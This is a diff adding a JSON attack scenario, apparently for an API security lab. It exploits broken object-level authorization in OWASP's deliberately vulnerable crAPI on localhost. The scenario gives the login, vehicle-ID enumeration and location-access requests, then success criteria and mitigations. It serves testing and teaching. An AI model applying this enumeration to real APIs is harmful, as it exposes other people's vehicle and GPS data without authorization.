@@ -1,0 +1,123 @@
+{
+  "id": "crapi-bola-vehicle-enumeration",
+  "name": "crAPI - Vehicle Data Enumeration (BOLA)",
+  "category": "API Security",
+  "difficulty": "Intermediate",
+  "description": "Exploits Broken Object Level Authorization (BOLA) in crAPI to enumerate and access other users' vehicle information by manipulating vehicle IDs",
+  "kind": "scenario",
+  "tags": [
+    "crapi",
+    "bola",
+    "idor",
+    "api",
+    "owasp-api-1"
+  ],
+  "target": "http://localhost:8888",
+  "estimatedDuration": "5-10 minutes",
+  "documentation": "https://github.com/OWASP/crAPI",
+  "prerequisites": [
+    "crAPI running on localhost:8888",
+    "Valid user account created in crAPI"
+  ],
+  "phases": [
+    {
+      "name": "reconnaissance",
+      "duration": 120,
+      "description": "Discover API endpoints and authentication mechanism"
+    },
+    {
+      "name": "weaponization",
+      "duration": 180,
+      "description": "Prepare vehicle ID enumeration payloads"
+    },
+    {
+      "name": "delivery",
+      "duration": 240,
+      "description": "Execute BOLA attacks against vehicle endpoints"
+    },
+    {
+      "name": "exploitation",
+      "duration": 300,
+      "description": "Access unauthorized vehicle data"
+    }
+  ],
+  "attackVectors": [
+    {
+      "classification": "BOLA",
+      "severity": "High",
+      "owasp": "API1:2023 Broken Object Level Authorization"
+    }
+  ],
+  "expectedResults": {
+    "successCriteria": [
+      "HTTP 200 responses for unauthorized vehicle IDs",
+      "Exposure of other users' vehicle data",
+      "Access to vehicle location information"
+    ],
+    "indicators": [
+      "Different VINs returned for each vehicle ID",
+      "Vehicle owner information exposed",
+      "GPS coordinates accessible without authorization"
+    ]
+  },
+  "mitigations": [
+    "Implement proper authorization checks on all vehicle endpoints",
+    "Verify user ownership before returning vehicle data",
+    "Use indirect references or UUIDs instead of sequential IDs",
+    "Implement rate limiting on enumeration-prone endpoints"
+  ],
+  "steps": [
+    {
+      "id": "user-login",
+      "name": "Authenticate to obtain JWT token",
+      "stage": "reconnaissance",
+      "request": {
+        "method": "POST",
+        "url": "/identity/api/auth/login",
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "victim@example.com",
+          "password": "Password123!"
+        }
+      }
+    },
+    {
+      "id": "get-own-vehicles",
+      "name": "Get legitimate user's vehicles to understand response structure",
+      "stage": "reconnaissance",
+      "request": {
+        "method": "GET",
+        "url": "/identity/api/v2/vehicle/vehicles",
+        "headers": {
+          "Authorization": "Bearer ${JWT_TOKEN}"
+        }
+      }
+    },
+    {
+      "id": "enumerate-vehicles",
+      "name": "Attempt to access vehicles by ID enumeration",
+      "stage": "reconnaissance",
+      "request": {
+        "method": "GET",
+        "url": "/identity/api/v2/vehicle/${VEHICLE_ID}",
+        "headers": {
+          "Authorization": "Bearer ${JWT_TOKEN}"
+        }
+      }
+    },
+    {
+      "id": "get-vehicle-location",
+      "name": "Access location data of enumerated vehicles",
+      "stage": "reconnaissance",
+      "request": {
+        "method": "GET",
+        "url": "/identity/api/v2/vehicle/${VEHICLE_ID}/location",
+        "headers": {
+          "Authorization": "Bearer ${JWT_TOKEN}"
+        }
+      }
+    }
+  ]
+}
